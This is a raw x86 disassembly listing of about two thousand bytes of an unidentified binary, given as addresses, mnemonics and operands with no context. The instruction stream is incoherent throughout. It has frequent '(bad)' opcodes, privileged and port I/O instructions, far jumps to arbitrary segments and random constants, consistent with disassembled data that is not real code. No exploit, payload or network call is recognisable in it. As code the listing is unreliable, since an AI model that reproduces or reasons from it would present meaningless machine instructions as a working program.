  422eea:	push   ss
  422eeb:	sbb    bl,BYTE PTR [ebp-0x2d2eab55]
  422ef1:	mov    esp,0x57839803
  422ef6:	loope  0x422f4a
  422ef8:	pop    esi
  422ef9:	fs stos BYTE PTR es:[edi],al
  422efb:	sbb    al,BYTE PTR [edx-0x1c]
  422efe:	xor    eax,0x81332bc7
  422f03:	jbe    0x422e86
  422f05:	(bad)  
  422f07:	rcr    ch,cl
  422f09:	inc    eax
  422f0a:	add    BYTE PTR [edx-0xaef43b9],dh
  422f10:	dec    ebx
  422f11:	cwde   
  422f12:	ror    ecx,1
  422f14:	inc    eax
  422f15:	cs pop ds
  422f17:	aam    0xf1
  422f19:	js     0x422ebc
  422f1b:	xchg   edx,eax
  422f1c:	push   ebx
  422f1d:	scas   eax,DWORD PTR es:[edi]
  422f1e:	test   BYTE PTR [ebx-0x4f],bl
  422f21:	test   esi,ebp
  422f23:	out    0xe2,eax
  422f25:	cmp    dl,bl
  422f27:	cmp    ch,BYTE PTR [ebp+0x1c]
  422f2a:	add    DWORD PTR [eax+0x64361f14],edx
  422f30:	rcl    BYTE PTR [edx+esi*2-0x1b],cl
  422f34:	shl    DWORD PTR [ebp-0x22],cl
  422f37:	mov    edx,0xd4e717f0
  422f3c:	xchg   ebp,eax
  422f3d:	leave  
  422f3e:	mov    cs,WORD PTR [edi]
  422f40:	lds    eax,FWORD PTR [edi+eax*2-0x3f]
  422f44:	sub    esi,DWORD PTR [bp+si+0x1c]
  422f48:	xchg   esp,eax
  422f49:	out    dx,al
  422f4a:	or     edi,edx
  422f4c:	xor    al,0x5c
  422f4e:	sbb    edx,0x5e5ff2e9
  422f54:	or     DWORD PTR [ebx-0x11],eax
  422f57:	test   eax,0x3148d025
  422f5c:	and    dl,BYTE PTR [eax+0x5a]
  422f5f:	sub    edi,ebx
  422f61:	mov    bl,0xee
  422f63:	nop
  422f64:	push   ecx
  422f65:	jb     0x422fbd
  422f67:	jns    0x422fe3
  422f69:	xchg   ecx,eax
  422f6a:	ja     0x422fc8
  422f6c:	push   esi
  422f6d:	scas   eax,DWORD PTR es:[edi]
  422f6e:	mov    esi,0xc17c3ee5
  422f73:	mov    dl,0xdc
  422f75:	jnp    0x422efa
  422f77:	lods   al,BYTE PTR ds:[esi]
  422f78:	out    0x78,al
  422f7a:	ja     0x422f9f
  422f7c:	push   ebp
  422f7d:	cmp    edi,DWORD PTR [esi]
  422f7f:	fs scas eax,DWORD PTR es:[edi]
  422f81:	pop    edx
  422f82:	push   0x4a2372a2
  422f87:	cli    
  422f88:	pusha  
  422f89:	push   0x2a834d9a
  422f8e:	jmp    0x89c4:0x47d6621a
  422f95:	adc    bh,ah
  422f97:	ins    BYTE PTR es:[edi],dx
  422f98:	sti    
  422f99:	push   esi
  422f9a:	push   es
  422f9b:	lods   eax,DWORD PTR ds:[esi]
  422f9c:	add    BYTE PTR [edi+edx*4+0x5c],0xd8
  422fa1:	gs daa 
  422fa3:	jb     0x422f2c
  422fa5:	push   0xd4d699b7
  422faa:	popa   
  422fab:	dec    ebp
  422fac:	ss inc esp
  422fae:	sbb    al,0xcf
  422fb0:	push   ebx
  422fb1:	aaa    
  422fb2:	push   esi
  422fb3:	xor    dl,BYTE PTR [ebx+0x38]
  422fb6:	ret    0x7508
  422fb9:	cmp    eax,0x59caa677
  422fbe:	pop    esp
  422fbf:	and    esi,esi
  422fc1:	push   edx
  422fc2:	cmp    BYTE PTR [esi-0x767ef4a0],ch
  422fc8:	in     eax,0xa8
  422fca:	loopne 0x422fea
  422fcc:	fcomip st,st(0)
  422fce:	cli    
  422fcf:	lds    ecx,FWORD PTR ds:0x1a983d27
  422fd5:	add    eax,0x63e473a8
  422fda:	or     DWORD PTR [ebx+0x42],ecx
  422fdd:	xchg   esi,eax
  422fde:	or     esi,0x508a6dc3
  422fe4:	adc    eax,0xb008b60c
  422fe9:	jnp    0x423001
  422feb:	mov    esi,0xdbe390e2
  422ff0:	lock mov dl,BYTE PTR [ecx+0x3d]
  422ff4:	lahf   
  422ff5:	jno    0x422ff7
  422ff7:	ret    
  422ff8:	addr16 mov ds:0x9606,al
  422ffc:	and    DWORD PTR [edi-0x3a],eax
  422fff:	popf   
  423000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423001:	enter  0x34ef,0xf0
  423005:	cmp    al,0x8b
  423007:	ja     0x422fe0
  423009:	test   BYTE PTR [eax],bl
  42300b:	loope  0x422faf
  42300d:	pop    es
  42300e:	sbb    BYTE PTR [ebp+0x62366463],bh
  423014:	jg     0x42306a
  423016:	add    al,0xf9
  423018:	sbb    DWORD PTR [edx+0x10],edx
  42301b:	cmp    BYTE PTR [edx],bh
  42301d:	stos   BYTE PTR es:[edi],al
  42301e:	fdivr  QWORD PTR [ecx+0x75]
  423021:	mov    ecx,0xccb90c70
  423026:	push   0xffffffb2
  423028:	stc    
  423029:	rep outs dx,BYTE PTR ds:[esi]
  42302b:	xchg   esp,eax
  42302c:	sub    dh,BYTE PTR [ebp+0x15466c1f]
  423032:	pop    es
  423033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423034:	aaa    
  423035:	sahf   
  423036:	aad    0x0
  423038:	pusha  
  423039:	xchg   esp,eax
  42303a:	js     0x4230b0
  42303c:	popa   
  42303d:	sub    ebp,DWORD PTR [edi]
  42303f:	idiv   BYTE PTR [eax-0x7a]
  423042:	dec    edi
  423043:	(bad)  
  423044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423047:	cmp    esi,DWORD PTR [eax+ecx*8]
  42304a:	sub    eax,0x510613bc
  42304f:	scas   al,BYTE PTR es:[edi]
  423050:	mov    ebp,0x9c9077c3
  423055:	ror    ebp,cl
  423057:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423059:	jmp    0xdedb:0xb3f42f80
  423060:	lds    eax,FWORD PTR [eax]
  423062:	scas   eax,DWORD PTR es:[edi]
  423063:	scas   al,BYTE PTR es:[edi]
  423064:	stos   BYTE PTR es:[edi],al
  423065:	mov    ecx,0x8d003325
  42306a:	cld    
  42306b:	js     0x42300b
  42306d:	and    BYTE PTR [esi],0x97
  423070:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423072:	arpl   WORD PTR [edi],cx
  423074:	fwait
  423075:	mov    dh,0xa3
  423077:	ds add ch,cl
  42307a:	clc    
  42307b:	(bad)  
  42307c:	(bad)  
  42307d:	xlat   BYTE PTR ds:[ebx]
  42307e:	mov    bl,0xd7
  423080:	fnsave [ecx-0x44]
  423083:	mov    edi,0x37d32bf0
  423088:	xor    ecx,esi
  42308a:	or     ecx,DWORD PTR [eax+0x4e97a8bb]
  423090:	stos   DWORD PTR es:[edi],eax
  423091:	mov    ebx,0xeb91a0e6
  423096:	xchg   dl,bl
  423098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423099:	je     0x42302e
  42309b:	jp     0x42308a
  42309d:	out    0x44,al
  42309f:	int    0x9b
  4230a1:	push   edx
  4230a2:	pop    ebx
  4230a3:	push   0xe3fc5652
  4230a8:	fild   DWORD PTR [ebx]
  4230aa:	mov    ah,BYTE PTR [edx+0x2b]
  4230ad:	pop    es
  4230ae:	jge    0x42307c
  4230b0:	loop   0x4230d6
  4230b2:	xor    al,BYTE PTR [edx]
  4230b4:	cmp    al,0x67
  4230b6:	addr16 mov dl,0x5f
  4230b9:	int    0x9e
  4230bb:	pop    edi
  4230bc:	mov    DWORD PTR [edi+0x7d12e5f3],esp
  4230c2:	call   0x75fa:0x86e1038e
  4230c9:	(bad)  
  4230ca:	das    
  4230cb:	imul   ecx,DWORD PTR [edi+0x678f8c07],0xcc19aae5
  4230d5:	add    BYTE PTR [eax+eax*2+0x38],0x1e
  4230da:	mov    dl,0x5b
  4230dc:	adc    dl,dh
  4230de:	jecxz  0x423151
  4230e0:	push   edx
  4230e1:	ss ins DWORD PTR es:[edi],dx
  4230e3:	test   al,0xa7
  4230e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230e6:	jl     0x42306c
  4230e8:	fisub  WORD PTR [ecx+0x5d]
  4230eb:	cmc    
  4230ec:	dec    ecx
  4230ed:	jb     0x4230e2
  4230ef:	mov    ah,0x8b
  4230f1:	ja     0x423133
  4230f3:	out    dx,eax
  4230f4:	nop
  4230f5:	dec    eax
  4230f6:	fsub   DWORD PTR [ebx+0xe016585]
  4230fc:	sub    BYTE PTR [ebx-0x6867a48e],0xe5
  423103:	dec    esp
  423104:	and    dh,BYTE PTR [ebp+0x54]
  423107:	test   DWORD PTR [edx+esi*2],eax
  42310a:	sbb    eax,0x805bfdb6
  42310f:	mov    ecx,0x6f93fb78
  423114:	sub    ch,dh
  423116:	mov    gs,WORD PTR [ecx+0x7d]
  423119:	(bad)
  42311c:	loopne 0x423119
  42311e:	jecxz  0x423193
  423120:	dec    edi
  423121:	mov    ch,0x52
  423123:	sahf   
  423124:	sub    eax,0x8b388b56
  423129:	add    al,0x21
  42312b:	nop
  42312c:	aam    0xd1
  42312e:	adc    cl,BYTE PTR [esi]
  423130:	sub    dh,ch
  423132:	imul   ebx,edi,0xffffffc9
  423135:	mov    bh,0x85
  423137:	pop    ss
  423138:	sahf   
  423139:	jne    0x4231a5
  42313b:	mov    WORD PTR [ebp+esi*4+0x7e41caad],?
  423142:	(bad)  
  423143:	enter  0x2a64,0xf6
  423147:	inc    eax
  423148:	fwait
  423149:	imul   BYTE PTR [edx-0x5780df35]
  42314f:	cmp    ch,BYTE PTR [esi-0x3960f9c6]
  423155:	mov    cs,esi
  423157:	push   cs
  423158:	cld    
  423159:	out    0xc8,al
  42315b:	adc    eax,0xe5b01fbf
  423160:	lods   al,BYTE PTR ds:[esi]
  423161:	add    eax,0x80140478
  423166:	and    ch,dh
  423168:	retf   
  423169:	fisttp QWORD PTR [ecx+ecx*8]
  42316c:	mov    esi,DWORD PTR [ebp-0x3aa51cec]
  423172:	and    bh,al
  423174:	icebp  
  423175:	dec    ebp
  423176:	inc    ecx
  423177:	out    0x2d,eax
  423179:	fisttp DWORD PTR [edx-0x64]
  42317c:	sbb    DWORD PTR [ecx],ebp
  42317e:	and    BYTE PTR [ebx-0x7f],al
  423181:	jns    0x42317f
  423183:	jnp    0x42318f
  423185:	repnz fild DWORD PTR [edx-0x76]
  423189:	xor    al,0x1f
  42318b:	jns    0x4231f3
  42318d:	fnstenv [ebp-0xce643ab]
  423193:	dec    ebx
  423194:	push   ds
  423195:	pop    ds
  423196:	mov    gs,WORD PTR ss:[edx-0x160d3715]
  42319d:	cmp    eax,0xa8b9e257
  4231a2:	(bad)  
  4231a3:	adc    al,0x6d
  4231a5:	les    edx,FWORD PTR [ecx-0x48412585]
  4231ab:	push   es
  4231ac:	nop
  4231ad:	das    
  4231ae:	shl    BYTE PTR [edx-0x353b19c4],0xf4
  4231b5:	jbe    0x423147
  4231b7:	imul   ebx,DWORD PTR [eax+ebx*1],0xffffff88
  4231bb:	or     BYTE PTR [edi-0x65a33171],ch
  4231c1:	push   edi
  4231c2:	shr    eax,1
  4231c4:	jp     0x42320d
  4231c6:	inc    eax
  4231c7:	fbld   TBYTE PTR [esi]
  4231c9:	test   DWORD PTR [eax+edi*4],0xb0830aeb
  4231d0:	aam    0xbe
  4231d2:	adc    bl,BYTE PTR [ebx-0x3b]
  4231d5:	sub    ch,BYTE PTR [edx+edx*8-0x1a]
  4231d9:	pusha  
  4231da:	shl    BYTE PTR ds:0xbeb6185b,0xd1
  4231e1:	add    BYTE PTR [edx],ah
  4231e3:	jmp    0x423202
  4231e5:	rcl    DWORD PTR [eax],cl
  4231e7:	aas    
  4231e8:	call   DWORD PTR [esi]
  4231ea:	stos   BYTE PTR es:[edi],al
  4231eb:	pop    ecx
  4231ec:	add    BYTE PTR [eax+0x5],al
  4231ef:	dec    esi
  4231f0:	add    DWORD PTR gs:[ebx+0x61],edx
  4231f4:	(bad)  
  4231f5:	mul    BYTE PTR [edi+0x3b]
  4231f8:	dec    ebx
  4231f9:	pinsrw mm0,WORD PTR [esi-0x7d24ffdd],0xce
  423201:	cld    
  423202:	jge    0x423241
  423204:	(bad)  
  423206:	mov    ebp,esp
  423208:	pop    ebp
  423209:	mov    eax,ds:0x41c1de4f
  42320e:	and    al,0xff
  423210:	int3   
  423211:	inc    BYTE PTR [eax+0x65]
  423214:	outs   dx,DWORD PTR ds:[esi]
  423215:	or     al,0x6f
  423217:	aaa    
  423218:	xor    DWORD PTR [edi-0x45c1e16e],0xfffffffc
  42321f:	jne    0x423246
  423221:	fcom   QWORD PTR [edi-0x4f9c8006]
  423227:	mov    BYTE PTR [eax+0x1a],cl
  42322a:	lahf   
  42322b:	push   edi
  42322c:	or     BYTE PTR [ecx+0x0],dh
  42322f:	mov    BYTE PTR [ebp+0x2d590e3b],dh
  423235:	inc    ecx
  423236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423237:	test   BYTE PTR [ecx],al
  423239:	push   0x3116c49a
  42323e:	repnz leave 
  423240:	shr    BYTE PTR [esi+eax*8],cl
  423243:	or     edx,edx
  423245:	popf   
  423246:	push   esp
  423247:	jmp    0x999d:0x48c9de1e
  42324e:	lods   al,BYTE PTR ds:[si]
  423250:	ins    DWORD PTR es:[edi],dx
  423251:	mov    ah,0x54
  423253:	pushf  
  423254:	repz cli 
  423256:	add    al,0xd2
  423258:	into   
  423259:	push   ss
  42325a:	dec    esp
  42325b:	shl    edi,cl
  42325d:	push   edx
  42325e:	adc    esp,DWORD PTR [esi]
  423260:	lods   al,BYTE PTR ds:[esi]
  423261:	sub    eax,0xf7f75958
  423266:	gs and eax,0x34adf63
  42326c:	arpl   WORD PTR [ebx+0x43],bp
  42326f:	jle    0x42329b
  423271:	and    DWORD PTR [edx-0xcda151c],ebp
  423277:	xchg   esi,eax
  423278:	arpl   WORD PTR [esi-0x75c58198],di
  42327e:	loopne 0x4232dd
  423280:	test   BYTE PTR [ebp+0x43bbc133],ah
  423286:	xchg   ecx,eax
  423287:	(bad)  
  423288:	jae    0x423282
  42328a:	outs   dx,DWORD PTR ds:[esi]
  42328b:	add    BYTE PTR [eax],bh
  42328d:	(bad)  
  42328e:	mov    dl,0x53
  423290:	outs   dx,DWORD PTR ds:[esi]
  423291:	psllw  mm6,QWORD PTR [ebx]
  423294:	(bad)  
  423295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423296:	bound  esp,QWORD PTR [eax-0x62]
  423299:	cdq    
  42329a:	outs   dx,BYTE PTR ds:[esi]
  42329b:	xchg   ebp,eax
  42329c:	shr    BYTE PTR [edi+0x7f64c9a5],0xa8
  4232a3:	push   es
  4232a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232a5:	xor    eax,0x4cca6c05
  4232aa:	or     BYTE PTR [esi+0x3e],bh
  4232ad:	(bad)  
  4232ae:	xor    al,0xe5
  4232b0:	mov    ?,WORD PTR [ebp+edx*1-0x5b91d26]
  4232b7:	aaa    
  4232b8:	mov    BYTE PTR [edx-0x253008a2],0x41
  4232bf:	ror    BYTE PTR ds:0x150c72b6,0xf2
  4232c6:	(bad)  
  4232c7:	cld    
  4232c8:	in     al,dx
  4232c9:	jmp    0xf656:0x60762ab2
  4232d0:	dec    ebx
  4232d1:	add    ah,BYTE PTR [edx-0x68a31900]
  4232d7:	push   es
  4232d8:	pop    ecx
  4232d9:	xor    ecx,esp
  4232db:	adc    ch,ch
  4232dd:	es and al,0x1c
  4232e0:	in     eax,dx
  4232e1:	cs pop edi
  4232e3:	hlt    
  4232e4:	jge    0x4232ae
  4232e6:	shl    ebx,cl
  4232e8:	es pop edi
  4232ea:	mov    cl,0x5
  4232ec:	test   BYTE PTR [ecx],al
  4232ee:	scas   al,BYTE PTR es:[edi]
  4232ef:	dec    edi
  4232f0:	xor    al,0x84
  4232f2:	fbld   TBYTE PTR cs:[ecx]
  4232f5:	xacquire xchg DWORD PTR [ecx],edi
  4232f8:	clc    
  4232f9:	or     eax,DWORD PTR [ecx+0x2b34e811]
  4232ff:	mov    eax,0x6d22f096
  423304:	(bad)  
  423305:	leave  
  423306:	cmp    DWORD PTR [esi+eiz*1],eax
  423309:	inc    esp
  42330a:	cdq    
  42330b:	fdiv   DWORD PTR [eax+0x35]
  42330e:	jecxz  0x42337a
  423310:	sqrtps xmm1,xmm1
  423313:	dec    edx
  423314:	add    eax,0xe8586429
  423319:	mov    fs,WORD PTR [edi+ecx*1+0x12d035be]
  423320:	adc    ecx,DWORD PTR [edx-0x5e0e132d]
  423326:	cld    
  423327:	fwait
  423328:	inc    ebp
  423329:	or     al,0xad
  42332b:	lock pop esp
  42332d:	leave  
  42332e:	rcl    BYTE PTR [ecx],0x4a
  423331:	fild   WORD PTR [esi-0x2ba8fdc6]
  423337:	dec    ecx
  423338:	test   dl,bh
  42333a:	jge    0x423399
  42333c:	daa    
  42333d:	mov    ebx,0x46cd484c
  423342:	ins    DWORD PTR es:[edi],dx
  423343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423344:	sbb    BYTE PTR [edi-0x5e],cl
  423347:	sub    DWORD PTR [ebx+0x42],ebp
  42334a:	mov    eax,ebp
  42334c:	mov    cl,0xc6
  42334e:	mov    ch,0x39
  423350:	sub    al,0x3
  423352:	adc    al,0xdd
  423354:	push   0xe888d62b
  423359:	jno    0x4232fd
  42335b:	jl     0x423338
  42335d:	outs   dx,DWORD PTR ds:[esi]
  42335e:	fild   WORD PTR [esp+ecx*8]
  423361:	(bad)  
  423362:	jle    0x423349
  423364:	xchg   ecx,eax
  423365:	clc    
  423366:	cmp    cl,BYTE PTR [ecx]
  423368:	mov    ecx,DWORD PTR [eax-0x2f6ca230]
  42336e:	cli    
  42336f:	mov    cl,al
  423371:	adc    edi,DWORD PTR [esp+ebp*4-0x55]
  423375:	pushw  0xffb1
  423378:	fwait
  423379:	imul   edx,DWORD PTR [ecx-0x11b3cc7c],0x388ae044
  423383:	pusha  
  423384:	loopne 0x423333
  423386:	fist   WORD PTR [eax-0x525e9ec5]
  42338c:	mov    edx,0x3aba5872
  423391:	push   esp
  423392:	fwait
  423393:	adc    ecx,ebp
  423395:	ins    DWORD PTR es:[edi],dx
  423396:	mov    ecx,DWORD PTR [esi]
  423398:	mov    dh,0x7f
  42339a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42339b:	out    0x58,al
  42339d:	ror    BYTE PTR [ebp+0x5f],cl
  4233a0:	cmp    esi,DWORD PTR [eax-0x5d630017]
  4233a6:	scas   al,BYTE PTR es:[edi]
  4233a7:	pop    ebp
  4233a8:	jnp    0x423395
  4233aa:	inc    ecx
  4233ab:	mov    BYTE PTR [edi-0x2641a680],0xc5
  4233b2:	mov    ?,esi
  4233b4:	push   esp
  4233b5:	cld    
  4233b6:	ret    
  4233b7:	jns    0x423363
  4233b9:	push   ecx
  4233ba:	fild   DWORD PTR [ecx-0xc]
  4233bd:	push   ecx
  4233be:	dec    edi
  4233bf:	jo     0x423386
  4233c1:	push   ds
  4233c2:	or     DWORD PTR [ebp+0x6b086598],edx
  4233c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233c9:	loopne 0x4233ba
  4233cb:	jo     0x423448
  4233cd:	gs jecxz 0x423412
  4233d0:	and    cl,BYTE PTR [ebx+eax*1+0x3d]
  4233d4:	fmul   QWORD PTR [ebp+0x308836f1]
  4233da:	pop    ecx
  4233db:	ja     0x42344e
  4233dd:	div    ch
  4233df:	outs   dx,DWORD PTR ds:[esi]
  4233e0:	sbb    esp,eax
  4233e2:	rcr    DWORD PTR [ebx],1
  4233e4:	scas   eax,DWORD PTR es:[edi]
  4233e5:	int    0xf0
  4233e7:	pop    esi
  4233e8:	push   0xb5f236ff
  4233ed:	mov    dl,0x41
  4233ef:	push   0xffffffa8
  4233f1:	test   al,0x4e
  4233f3:	pop    ebp
  4233f4:	sti    
  4233f5:	icebp  
  4233f6:	jb     0x42340f
  4233f8:	test   DWORD PTR [eax+0x104d29f3],ebx
  4233fe:	hlt    
  4233ff:	inc    ecx
  423400:	jge    0x4233b4
  423402:	ja     0x42346c
  423404:	outs   dx,DWORD PTR ds:[esi]
  423405:	jmp    0x47717e04
  42340a:	pop    ds
  42340b:	lock lds ecx,FWORD PTR [eax-0x34a1c3ee]
  423412:	lds    ecx,FWORD PTR [edi+0x68]
  423415:	sub    BYTE PTR [ebx+0x46ec950],ah
  42341b:	adc    al,0x8d
  42341d:	outs   dx,DWORD PTR ds:[esi]
  42341e:	out    0x38,eax
  423420:	test   al,0xa5
  423422:	and    ebp,ebp
  423424:	push   ecx
  423425:	mov    ds:0x9424e30,al
  42342a:	adc    BYTE PTR [esi+eax*2+0x2903721c],0xbc
  423432:	add    al,0x55
  423434:	js     0x423434
  423436:	mov    bh,0x2
  423438:	clc    
  423439:	lea    esp,[esi-0x11da7ca0]
  42343f:	sbb    esi,DWORD PTR [ebx]
  423441:	jmp    0x1cb4:0xc30bccb1
  423448:	cmp    BYTE PTR [ebx],bl
  42344a:	pop    ds
  42344b:	cmp    BYTE PTR [ebx],dh
  42344d:	mov    ebx,0x8c7e1f27
  423452:	and    al,0x2
  423454:	retf   0x51cd
  423457:	sub    al,0xdf
  423459:	loope  0x423436
  42345b:	scas   eax,DWORD PTR es:[edi]
  42345c:	push   ecx
  42345d:	mov    db0,esi
  423460:	cmp    dl,al
  423462:	ret    0x38b7
  423465:	cmp    DWORD PTR [eax+eiz*4],ebx
  423468:	mov    edx,DWORD PTR [edx-0x7bf34bd7]
  42346e:	into   
  42346f:	sti    
  423470:	or     al,BYTE PTR [esi]
  423472:	or     BYTE PTR [eax],0x56
  423475:	add    DWORD PTR [esi-0x6994289c],ebp
  42347b:	jp     0x423496
  42347d:	aam    0x96
  42347f:	push   ebp
  423480:	pop    edx
  423481:	sbb    DWORD PTR [esi+edi*2+0x2c56697b],esi
  423488:	mov    bh,0x6a
  42348a:	(bad)  
  42348c:	bound  edi,QWORD PTR [edi*1-0x1b58372f]
  423493:	ja     0x423418
  423495:	xor    DWORD PTR [edx-0x1b],edx
  423498:	jns    0x4234a7
  42349a:	and    DWORD PTR [ebp+eax*1-0x74],esp
  42349e:	std    
  42349f:	inc    eax
  4234a0:	into   
  4234a1:	inc    ebp
  4234a2:	add    bl,BYTE PTR [eax]
  4234a4:	jg     0x4234cd
  4234a6:	rol    edi,0xd9
  4234a9:	xor    eax,ebp
  4234ab:	xor    bh,bl
  4234ad:	inc    edi
  4234ae:	out    0x2,al
  4234b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234b1:	mov    al,ds:0xfcb0aeed
  4234b6:	dec    edi
  4234b7:	je     0x423470
  4234b9:	xor    ecx,ebp
  4234bb:	dec    ebx
  4234bc:	test   al,0x28
  4234be:	mov    BYTE PTR [ecx],dh
  4234c0:	retf   0xd76d
  4234c3:	jne    0x423508
  4234c5:	mov    ecx,0x4c836989
  4234ca:	js     0x423541
  4234cc:	add    ebp,DWORD PTR [esi]
  4234ce:	mov    dl,BYTE PTR [esi]
  4234d0:	mov    edx,0x33b10444
  4234d5:	xor    eax,0x5487bb73
  4234da:	push   es
  4234db:	mov    ?,WORD PTR [esi+edi*8]
  4234de:	bound  edx,QWORD PTR [edi+0x1]
  4234e1:	cli    
  4234e2:	jg     0x423541
  4234e4:	sub    al,0x2e
  4234e6:	pusha  
  4234e7:	imul   esi,DWORD PTR [ecx+edi*2],0xffffffcd
  4234eb:	unpcklps xmm3,XMMWORD PTR [edi-0x7c13b476]
  4234f2:	dec    edx
  4234f3:	xor    BYTE PTR [ebp-0x166d196f],0x26
  4234fa:	mov    BYTE PTR [ecx-0x6f378639],cl
  423500:	pop    ebx
  423501:	sbb    eax,0x786dc546
  423506:	inc    edi
  423507:	data16 sahf 
  423509:	mov    esp,ebx
  42350b:	lock mov ds:0x8ec8e9b8,al
  423511:	bound  esi,QWORD PTR [eax]
  423513:	call   0xc153:0x3aeff933
  42351a:	inc    ebx
  42351b:	xchg   DWORD PTR [ebp-0x527281e6],ebx
  423521:	retf   0xe3c4
  423524:	ds dec ebp
  423526:	lods   al,BYTE PTR ds:[esi]
  423527:	cmp    bh,ch
  423529:	cwde   
  42352a:	retf   0xda4b
  42352d:	jle    0x4235a6
  42352f:	gs popa 
  423531:	sub    ebp,0xa3a90f3
  423537:	mov    eax,ds:0xd7777c59
  42353c:	dec    esp
  42353d:	mov    esi,0x4db5f9d7
  423542:	ret    0x5760
  423545:	enter  0x93e1,0x2d
  423549:	or     esp,DWORD PTR [esi]
  42354b:	jmp    FWORD PTR [ecx+eiz*8-0x4d]
  42354f:	push   ecx
  423550:	std    
  423551:	jb     0x423529
  423553:	sbb    al,0xf
  423555:	loopne 0x423529
  423557:	sub    BYTE PTR [eax+ebx*1-0x7834f025],dh
  42355e:	repz fbld TBYTE PTR [edi+0xf4a0e93]
  423565:	or     DWORD PTR [edx],0x58
  423568:	xchg   ebp,eax
  423569:	mov    eax,0xd02f01b8
  42356e:	cli    
  42356f:	sub    ch,al
  423571:	and    ah,BYTE PTR [ecx]
  423573:	xchg   ecx,eax
  423574:	cmp    bl,0xf1
  423577:	add    al,0xe4
  423579:	loop   0x423542
  42357b:	dec    esi
  42357c:	neg    ch
  42357e:	and    DWORD PTR [edi+0x7e],esi
  423581:	jo     0x42357a
  423583:	adc    ah,al
  423585:	test   bh,bh
  423587:	add    BYTE PTR [ebp-0x66],0x5f
  42358b:	ins    BYTE PTR es:[edi],dx
  42358c:	add    BYTE PTR [eax],bl
  42358e:	push   0x93f58b36
  423593:	stos   DWORD PTR es:[edi],eax
  423594:	in     eax,0xe8
  423596:	test   DWORD PTR [edx-0x6a],ebx
  423599:	mov    edx,0x13644268
  42359e:	ja     0x423553
  4235a0:	pop    edi
  4235a1:	xor    eax,0xce20b1c8
  4235a6:	scas   al,BYTE PTR es:[edi]
  4235a7:	xchg   esp,eax
  4235a8:	sub    edi,esp
  4235aa:	fist   DWORD PTR ds:0xe6d90daa
  4235b0:	push   cs
  4235b1:	push   eax
  4235b2:	xor    BYTE PTR [edx],dh
  4235b4:	sbb    bh,cl
  4235b6:	inc    esi
  4235b7:	pop    esi
  4235b8:	push   ebp
  4235b9:	mov    al,gs:0xcd9bb434
  4235bf:	retf   0x88d
  4235c2:	enter  0x1cfe,0x4f
  4235c6:	mov    bl,0xa5
  4235c8:	std    
  4235c9:	stos   BYTE PTR es:[edi],al
  4235ca:	out    0x73,eax
  4235cc:	or     edi,DWORD PTR [esi-0x33]
  4235cf:	mov    ecx,0x8d477f1
  4235d4:	pop    esi
  4235d5:	fucom  st(5)
  4235d7:	or     DWORD PTR [esi],ecx
  4235d9:	or     ch,al
  4235db:	jl     0x42362c
  4235dd:	mov    esi,0xd806886e
  4235e2:	mov    edx,0x1dd5783d
  4235e7:	lods   eax,DWORD PTR ds:[esi]
  4235e8:	sbb    DWORD PTR [edi],edi
  4235ea:	inc    ecx
  4235eb:	out    0x90,eax
  4235ed:	and    bh,BYTE PTR [edi+edi*1+0x5c]
  4235f1:	xchg   esi,eax
  4235f2:	mov    eax,0x975b995f
  4235f7:	hlt    
  4235f8:	loop   0x4235ce
  4235fa:	gs or  al,0xd2
  4235fd:	and    ah,al
  4235ff:	scas   eax,DWORD PTR es:[edi]
  423600:	inc    ebx
  423601:	mov    cl,0x47
  423603:	pop    esi
  423604:	sbb    bl,BYTE PTR gs:[ebp+0x36897b6b]
  42360b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42360c:	idiv   DWORD PTR [edx+0x32]
  42360f:	(bad)  
  423610:	sbb    al,al
  423612:	add    DWORD PTR [ebx*2+0x3a475736],0x235c3647
  42361d:	xor    eax,DWORD PTR [ebp-0xc395f23]
  423623:	push   edi
  423624:	lock add al,0x69
  423627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423628:	push   cs
  423629:	xor    al,0x1e
  42362b:	and    BYTE PTR ds:0x3721170e,ah
  423631:	and    BYTE PTR [eax],bl
  423633:	sub    DWORD PTR [edi-0xa],0xe697dafc
  42363a:	cs pop ss
  42363c:	jp     0x4235d3
  42363e:	imul   edi,DWORD PTR [ebp+0x41],0x52
  423642:	or     cl,BYTE PTR [eax]
  423644:	gs cmc 
  423646:	mov    BYTE PTR [esi-0x7866abd0],bh
  42364c:	push   es
  42364d:	ins    BYTE PTR es:[edi],dx
  42364e:	and    al,0x6c
  423650:	pop    esi
  423652:	pop    ds
  423653:	nop
  423654:	and    eax,0x3a64d5c9
  423659:	push   0x34
  42365b:	or     BYTE PTR [edx+0x2f],0xd4
  42365f:	mov    ecx,0x38a8acc
  423664:	push   esi
  423665:	jmp    0x2142f538
  42366a:	scas   eax,DWORD PTR es:[edi]
  42366b:	or     eax,esi
  42366d:	xor    eax,0x66cc6681
  423672:	scas   al,BYTE PTR es:[edi]
  423673:	dec    esp
  423674:	cmp    BYTE PTR [edx],bl
  423676:	cmp    edi,eax
  423678:	es aaa 
  42367a:	test   esi,0x406acc7a
  423680:	dec    edi
  423681:	add    BYTE PTR [edx-0x5661fb2b],bh
  423687:	push   esi
  423688:	pusha  
  423689:	ret    0x5fdf
  42368c:	loop   0x4236a0
  42368e:	stos   DWORD PTR es:[edi],eax
  42368f:	mov    esp,0xf88f81df
  423694:	xchg   DWORD PTR [edx+eax*4],ebx
  423697:	dec    esi
  423698:	push   es
  423699:	sahf   
  42369a:	sub    dl,0xd1
  42369d:	inc    esi
  42369e:	in     al,dx
  42369f:	bound  ecx,QWORD PTR [ebx-0x2b]
  4236a2:	dec    eax
